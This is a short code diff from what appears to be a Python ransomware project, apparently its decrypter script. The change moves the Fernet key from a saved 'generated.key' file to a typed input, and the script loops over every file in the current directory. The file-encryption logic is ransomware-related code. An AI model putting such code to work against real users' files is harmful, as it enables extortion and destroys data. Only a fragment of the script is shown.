@@ -4,15 +4,14 @@ from cryptography.fernet import Fernet
 file_list = []
 
 for file in os.listdir():
-	if file == 'ransomware.py' or file == 'ransomdecrypter.py' or file == 'desktop.ini' or file == 'generated.key':
+	if file == 'ransomware.py' or file == 'ransomdecrypter.py' or file == 'desktop.ini':
 		continue
 	if os.path.isfile(file):
 		file_list.append(file)
 
 
 
-with open('generated.key', 'rb') as generatedkey:
-	secret_key = generatedkey.read()
+secret_key = input('Enter a secret key: ')
 
 for file in file_list:
 	with open(file,'rb') as the_file:
